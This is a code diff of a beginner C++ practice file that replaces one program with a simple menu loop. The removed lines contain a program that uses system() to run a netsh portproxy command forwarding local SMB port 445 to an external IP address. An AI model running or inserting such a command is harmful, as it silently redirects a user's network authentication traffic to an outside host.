@@ -18,36 +18,44 @@
     •
 
 */
-// what's the value of j
 
-// #include<iostream>
-// using namespace std;
-
-// int main()
-// {
-//   int i=4;
-//   int j=(i++)+(++i);          //this becomes 4+6
-//   cout<<"Value is :"<<j<<endl;
-//   return 0;
-// }
 #include<iostream>
-#include <cstdlib>
+using namespace std;
+
+int option0() {
+    cout << "Program Ending" << endl;
+    return 0;
+}
+
+int option1() {
+    cout << "Program Continuing" << endl;
+    return 1;
+}
 
 int main() {
-    // Command to execute
-    const char* command = "netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=445 connectaddress=122.176.54.41 connectport=4456";
+    int value = 1;
+    while (value == 1) {
+        int option;
+        cin >> option;
 
-    // Execute the command
-    int result = system(command);
+        if (option == 0) {
+            int value = option0();
+            cout << "Value of Value 0 is = " << value << endl;
 
-    // Check the result of the command execution
-    if (result == 0) {
-        // Command executed successfully
-        std::cout << "Command executed successfully." << std::endl;
-    } else {
-        // Command execution failed
-        std::cerr << "Command execution failed." << std::endl;
+            if (value == 0) {
+                break; // Exit the loop
+            }
+
+        } else if (option == 1) {
+            int value = option1();
+            cout << "Value of Value 1 is = " << value << endl;
+            if (value == 1) {
+                continue;
+            }
+            // else, the loop will continue without the need for an explicit continue statement
+        }
+    value = 1;
     }
-
-    return 0;
+    value = 1;
+    return 0; // The program will exit when the loop ends
 }
